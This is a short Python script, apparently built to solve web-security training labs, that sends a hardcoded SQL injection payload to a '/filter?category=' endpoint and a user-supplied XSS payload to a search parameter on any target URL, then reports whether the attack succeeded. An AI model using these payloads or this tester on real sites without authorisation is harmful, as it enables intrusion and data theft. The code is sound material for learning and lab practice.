#!/usr/bin/env python3

import requests
import sys
from urllib.parse import quote
from bs4 import BeautifulSoup
from datetime import datetime

def test_sql_injection(url):
    """
    Test for SQL injection by injecting a payload into the URL.
    """
    print("\n[*] Testing for SQL Injection...")
    endpoint = '/filter?category='
    payload = "administrator' --"
    final_url = f"{url}{endpoint}{payload}"

    try:
        response = requests.get(final_url, timeout=10)

        # Check HTTP response
        if response.status_code != 200:
            print(f"[!] HTTP request failed with status code: {response.status_code}")
            return

        # Parse the response
        soup = BeautifulSoup(response.text, 'html.parser')
        lab_solved_element = soup.find('h4')

        if lab_solved_element:
            lab_solved_text = lab_solved_element.text.strip().lower()
            if 'congratulation' in lab_solved_text:
                print("[+] SQL Injection Successful! Lab is solved. 🎉")
            else:
                print("[-] SQL Injection did not solve the lab.")
        else:
            print("[!] Could not find the expected element in the response.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during SQL Injection test: {e}")


def test_xss(url, payload):
    """
    Test for XSS by injecting a payload into the URL.
    """
    print("\n[*] Testing for XSS...")
    encoded_payload = quote(payload)
    final_url = f"{url}/?search={encoded_payload}"

    print("\n[+] Testing URL:", final_url)

    try:
        response = requests.get(final_url, timeout=10)

        # Check HTTP response
        if response.status_code == 200:
            if payload in response.text:
                print("[+] XSS Payload reflected in the response! Vulnerability confirmed.")
            else:
                print("[-] XSS Payload not reflected.")
        else:
            print(f"[-] Unexpected response code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during XSS test: {e}")


def main():
    """
    Main function to handle user input and call the vulnerability tests.
    """
    print("=== Vulnerability Tester ===\n")
    url = input("Enter the target URL (e.g., http://example.com): ").strip()

    if not url.startswith("http://") and not url.startswith("https://"):
        print("[!] Invalid URL format. Ensure it starts with http:// or https://.")
        return

    print("\nChoose a vulnerability to test:")
    print("1. SQL Injection")
    print("2. Cross-Site Scripting (XSS)")
    choice = input("Enter your choice (1 or 2): ").strip()

    if choice == '1':
        # Log start time for SQL Injection test
        print(f"\n[*] SQL Injection test started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        test_sql_injection(url)
    elif choice == '2':
        payload = input("Enter your XSS payload: ").strip()
        # Log start time for XSS test
        print(f"\n[*] XSS test started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        test_xss(url, payload)
    else:
        print("[!] Invalid choice. Please select 1 or 2.")

    # Log end time
    print(f"\n[*] Test ended at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")


if __name__ == "__main__":
    main()
